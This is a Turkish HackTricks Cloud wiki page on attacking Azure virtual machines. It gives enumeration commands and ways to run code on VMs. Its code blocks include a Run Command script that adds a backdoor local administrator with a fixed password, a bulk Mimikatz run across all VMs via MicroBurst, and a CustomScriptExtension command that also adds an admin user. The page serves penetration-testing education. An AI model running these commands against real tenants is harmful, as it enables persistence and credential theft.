# Az - Sanal Makineler ve Ağ

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel bilgiler

[Belgelerden alıntı:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure sanal makineler, Azure'ın sunduğu birkaç türden biridir [ihtiyaca göre ölçeklenebilir hesaplama kaynakları](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree). Genellikle, diğer seçeneklerin sunmadığı hesaplama ortamı üzerinde daha fazla kontrol gerektiğinde sanal makine seçersiniz. Bu makale, bir sanal makine oluşturmadan önce dikkate almanız gereken bilgileri, nasıl oluşturulacağını ve nasıl yönetileceğini size verir.

## Azure Ağ Bilgileri

Azure ağları **farklı varlıklar ve yapılandırma yöntemleri içerir.** Farklı Azure ağ varlıklarının kısa **açıklamalarını,** **örneklerini** ve **numaralandırma** komutlarını aşağıdaki bağlantıda bulabilirsiniz:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**, Azure portalı üzerinden SSL aracılığıyla güvenli, tamamen yönetilen bir RDP (Uzak Masaüstü Protokolü) ve SSH (Güvenli Kabuk) erişim çözümü sunar. Azure Sanal Ağı içinde entegre edilmiştir ve RDP ve SSH bağlantılarını özel IP'ler kullanarak VM'lere sağlar, halka açık IP'lerin gereksiz hale gelmesini sağlar. Bu, geliştiricilerin ve IT personelinin tarayıcılarını kullanarak Azure portalından VM'lere güvenli bir şekilde erişmelerini sağlar, geliştirme ve test ortamları için süreci basitleştirir.

Aboneliğinizdeki tüm Azure Bastion Ana Bilgisayarlarını listelemek için aşağıdaki komutu kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Numaralandırma
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Bir VM'de komut çalıştırın**

### **VM'de AAD Girişi**

AzureAD üzerinden kimlik doğrulaması yapılmış kullanıcılara erişime izin vermek mümkündür. Örneğin bir **linux VM**'ye erişmeye çalışırken: `ssh kullanıcıadı@azure-corp.com@1.1.1.1` (giriş yapmaya çalışırken kullanılan azurecorp ile **e-postayı kullanmak önemlidir**) gibi bir hata alabilirsiniz:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Sadece **bu talimatları takip edin** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) adresine gidin ve kodu belirtin, kimlik bilgileri olarak e-posta ve şifreyi kullanın ve SSH üzerinden bağlantı kurabileceksiniz (eğer bu kullanıcı yeterli izne sahipse: `Sanal Makine Yönetici Girişi` veya `Sanal Makine Kullanıcı Girişi` rolü).

### **Komut Çalıştır**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Özel Komut Uzantısını Çalıştırın**

Azure sanal makine (VM) uzantıları, **Azure VM'lerinde** sonrasında yapılandırma ve otomasyon **görevleri** sağlayan **küçük uygulamalar**dır. Örneğin, bir sanal makine yazılım kurulumu, antivirüs koruması veya içinde bir komut dosyası çalıştırma yeteneği gerektiriyorsa, bir VM uzantısı kullanabilirsiniz.

Bu nedenle, yazma erişiminiz varsa keyfi kodu yürütebilirsiniz:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC), Ansible'a benzer şekilde kullanılan bir PowerShell aracıdır ve bir ana bilgisayarı kod aracılığıyla yapılandırmak için kullanılır. DSC, belirli yapılandırma dosyalarının yüklenmesine izin veren Azure ile entegre olur. Bu dosyalar katı bir sözdizimine uymalıdır. Özellikle, Azure'daki DSC uzantısı, belirli biçimlendirme kriterlerini karşılayan dosyalardan komutları yürütebilir, hatta sözdizimi DSC standartlarına uygun değilse bile, sağlanan şekilde gösterildiği gibi.

Bu komutların yürütülmesi, Az PowerShell'deki [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) işlevi tarafından kolaylaştırılır. Gereksinimler arasında tanımlı bir işlev içeren bir **.PS1** dosyası ve dosyanın bir **.zip** dosyasına sıkıştırılması bulunur. DSC için sözdizimi doğru olmasa bile, kod hala yürütülecektir. Ancak, uzantı yürütme durumunu "başarısızlık" olarak işaretleyecek ve komuttan gelen çıktı görünmeyecektir çünkü durum başarısızlık mesajı tarafından üzerine yazılacaktır.

### VM Uygulama Tanımları

VM Uygulama Tanımları, sürümlü uygulamaların Azure VM'ye tekrarlanabilir bir şekilde dağıtılmasına olanak tanır. Bu kaynak, uygulamaların VM'ler arasında dağıtılmasını ve güncellenmesini destekler. Bunun kurulması için **`New-AzGalleryApplication`** ve **`New-AzGalleryApplicationVersion`** gibi komutları içeren adımlar gereklidir Az PowerShell'de.

Bu yöntemle uygulamaların veya komutların yürütülmesi, uygulama bir VM'ye uygulandığında otomatik olarak yüklenen **"VMAppExtension"** ile gerçekleştirilir. Uzantı, belirtilen URI'den dosyayı alır ve uygulama adıyla, uzantısız olarak adlandırır. Dosyayı doğru şekilde yürütmek için REST API çağrısındaki "ManageActions" alanının dosyayı uygun uzantıyla yeniden adlandırmak için yapılandırılması gerekir. Bu yöntemin kurulumu tamamlandığında, sağlanan şekilde gösterildiği gibi bir yapıya benzeyecektir.

Ancak, bu yürütme yöntemi oldukça yavaş olup, bir uygulamanın veya komutun yürütülmesi yaklaşık 3-4 dakika sürer. Bu sürece ilişkin dosyalar, uygulama kopyası için (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`) ve yürütme durumu için (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`) belirli dizinlerde saklanır.

Her iki teknik de Azure ortamlarında komutların yürütülmesi ve uygulamaların dağıtılması için benzersiz yöntemler sunar, her birinin kendi gereksinimleri, adımları ve dikkate alınması gerekenleri vardır.

### Azure'daki Hybrid Worker Groups (HWG'ler)

[**Hybrid Worker Groups (HWG'ler)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker), bir Automation Account'ta yapılandırılmış Runbook'ların, belirlenmiş HWG'nin bir parçası olan bir Azure Sanal Makinesi (VM) üzerinde yürütülmesine olanak tanıyan bir özelliktir. Bu yürütme, VM üzerine yüklenen bir uzantı aracılığıyla gerçekleştirilir ve Runbook kodunu VM'ye dağıtır. Bu sürecin önemli bir yönü, gerçek kimlik bilgilerinin yürütmede bir faktör olmamasıdır çünkü kod, özellikle **SYSTEM** veya root olarak yükseltilmiş ayrıcalıklarla çalışır, sağlanan şekilde gösterildiği gibi.

Windows 10 VM'lerini kullananlar için önemli bir detay, Runbook için PowerShell sürümünü belirtme gerekliliğidir. Runbook'un PowerShell Sürümünün 7.1 yerine 5.1 olarak ayarlanması gerekmektedir. Bu gereklilik, PowerShell 7.1'in bu VM'lerde varsayılan olarak yüklü olmamasından kaynaklanmaktadır ve 7.1 sürümü belirtilirse betik yürütmesinde bir başarısızlığa neden olabilir.

Azure'ın bu özelliği, hibrit ortamlarda görevleri otomatikleştirmek ve yönetmek için güçlü bir yöntem sunar, Azure VM'lerinde görevlerin merkezi yönetimi ve yürütülmesine olanak tanır.
